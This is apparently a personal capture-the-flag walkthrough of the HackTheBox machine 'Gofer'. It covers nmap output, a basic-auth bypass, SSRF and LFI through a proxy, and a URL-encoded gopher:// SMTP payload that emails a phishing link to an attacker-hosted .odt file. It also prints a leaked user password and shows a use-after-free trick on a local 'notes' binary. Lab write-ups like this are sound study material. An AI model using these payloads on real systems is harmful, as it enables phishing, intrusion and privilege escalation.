
## Recon

~~~
sudo nmap -sCV 10.10.11.225  -T4
~~~

~~~
┌──(mrg0d㉿GodsHome)-[~/Desktop]
└─$ sudo nmap -sCV 10.10.11.225  -T4
[sudo] password for mrg0d: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-31 10:13 IST
Nmap scan report for gofer.htb (10.10.11.225)
Host is up (0.26s latency).
Not shown: 995 closed tcp ports (reset)
PORT    STATE    SERVICE     VERSION
22/tcp  open     ssh         OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 aa25826eb804b6a9a95e1a91f09451dd (RSA)
|   256 1821baa7dce44f60d781039a5dc2e596 (ECDSA)
|_  256 a42d0d45132a9e7f867af6f778bc42d9 (ED25519)
25/tcp  filtered smtp
80/tcp  open     http        Apache httpd 2.4.56
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Gofer
139/tcp open     netbios-ssn Samba smbd 4.6.2
445/tcp open     netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2023-07-31T04:43:51
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.93 seconds
~~~

add gofer.htb to /etc/hosts

![[Pasted image 20230801195635.png]]

This is the Landing Page , i dont find anything Special..!!

More enumeration needed..!!!

Found subdomain `proxy.gofer.htb`

added `/etc/hosts`

![[Pasted image 20230802100520.png]]

There is Basic Auth..!!

I tried to bypass ...

Yes..~ i can By simply changing it to post , i can get response..!!

I ennumerated more there i found `index.php`

![[Pasted image 20230802100917.png]]

Says `missing URL parameter`

So , Then add url parameter..!!!

![[Pasted image 20230802101222.png]]
![[Pasted image 20230802101244.png]]

It worked..!!

Have to get rev shell from this ..!! I fixed..>

So  remember the machine name is : gopher..!!

Go with gopher protocol..!!

Also when i read index.php ..!!! i can bypass  , with that i got LFI..!!

![[Pasted image 20230802102651.png]]

For further..!! i found a tool gopherus..!!

It is gopher smtp , thing..!!

We can see smtp is filtered in nmap..!!

https://sirleeroyjenkins.medium.com/just-gopher-it-escalating-a-blind-ssrf-to-rce-for-15k-f5329a974530

Found this Blog..!!

Got stucked  at the stage..!! Asked my friends..!

It is Phishing message kindah think.

We have to send some phishing link via smtp (Mail)

~~~
gopher://2130706433:25/xHELO%20gofer.htb%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cjhudson@gofer.htb%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cjhudson@gofer.htb%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%20<a+href%3d'http%3a//10.10.14.86/l4tmur.odt>this</a>%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
~~~~

![[Pasted image 20230802104519.png]]








![[Pasted image 20230731205759.png]]

![[Pasted image 20230801015011.png]]

~~~
tbuckley:ooP4dietie3o_hquaeti
~~~

![[Pasted image 20230802104606.png]]

~~~
tbuckley@gofer:~/platon$ notes
========================================
1) Create an user and choose an username
2) Show user information
3) Delete an user
4) Write a note
5) Show a note
6) Save a note (not yet implemented)
7) Delete a note
8) Backup notes
9) Quit
========================================


Your choice: 1

Choose an username: l4tmur

========================================
1) Create an user and choose an username
2) Show user information
3) Delete an user
4) Write a note
5) Show a note
6) Save a note (not yet implemented)
7) Delete a note
8) Backup notes
9) Quit
========================================


Your choice: 3

========================================
1) Create an user and choose an username
2) Show user information
3) Delete an user
4) Write a note
5) Show a note
6) Save a note (not yet implemented)
7) Delete a note
8) Backup notes
9) Quit
========================================


Your choice: 4

Write your note:
AAAAAAAAAAAAAAAAAAAAAAAAadmin
========================================
1) Create an user and choose an username
2) Show user information
3) Delete an user
4) Write a note
5) Show a note
6) Save a note (not yet implemented)
7) Delete a note
8) Backup notes
9) Quit
========================================


Your choice: 2


Username: AAAAAAAAAAAAAAAAAAAAAAAAadmin
Role: admin

========================================
1) Create an user and choose an username
2) Show user information
3) Delete an user
4) Write a note
5) Show a note
6) Save a note (not yet implemented)
7) Delete a note
8) Backup notes
9) Quit
========================================


Your choice: 8

Access granted!
client_loop: send disconnect: Broken pipe

~~~

![[Pasted image 20230802104936.png]]